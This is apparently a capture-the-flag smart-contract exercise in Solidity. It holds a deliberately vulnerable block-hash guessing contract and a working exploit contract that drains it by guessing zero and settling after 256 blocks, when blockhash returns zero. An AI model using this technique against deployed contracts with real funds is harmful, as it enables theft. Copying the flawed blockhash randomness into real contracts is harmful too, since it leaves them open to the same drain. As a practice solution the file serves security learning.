pragma solidity ^0.4.21;

contract PredictTheBlockHashChallenge {
    address guesser;
    bytes32 guess;
    uint256 settlementBlockNumber;

    function PredictTheBlockHashChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(bytes32 hash) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = hash;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        bytes32 answer = block.blockhash(settlementBlockNumber);

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

interface IPredictTheFutureChallenge {
    function lockInGuess(uint8 n) external payable;
    function settle() external;
    function isComplete() external view returns (bool);
}

contract PredictTheBlockHashExploit {
    PredictTheBlockHashChallenge challenge;
    bytes32 public guess;
    
    function PredictTheBlockHashExploit(address challengeAddress) public {
        challenge = PredictTheBlockHashChallenge(challengeAddress);
    }

    function lockInMyGuess() public payable {
        require(msg.value == 1 ether);
        guess = 0x0;
        challenge.lockInGuess.value(1 ether)(guess);
    }

    // we call this 256 blocks after the settlement lock has been made
    function tryToSettle() public returns (bool) {
        challenge.settle();
        return challenge.isComplete();
    }

    function contractBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function withdraw() public {
        msg.sender.transfer(address(this).balance);
    }

    function() public payable {}
}
